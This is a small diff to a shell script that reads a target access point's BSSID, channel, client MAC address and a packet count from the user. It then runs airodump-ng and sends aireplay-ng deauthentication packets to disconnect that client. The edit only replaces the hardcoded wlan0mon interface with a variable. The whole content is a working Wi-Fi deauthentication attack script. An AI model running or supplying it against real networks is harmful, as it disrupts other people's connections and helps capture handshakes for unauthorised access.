@@ -21,7 +21,7 @@ read 'bssid'
 echo "channel:"
 read 'channel'
 
-airodump-ng --bssid $bssid --channel $channel wlan0mon
+airodump-ng --bssid $bssid --channel $channel "$iface"mon
 
 echo "mac:"
 read 'mac'
@@ -29,6 +29,6 @@ read 'mac'
 echo "number of packets:"
 read 'p'
 
-aireplay-ng -0 $p -a $bssid -c $mac wlan0mon;airmon-ng stop "$iface"mon
+aireplay-ng -0 $p -a $bssid -c $mac "$iface"mon;airmon-ng stop "$iface"mon
 
 
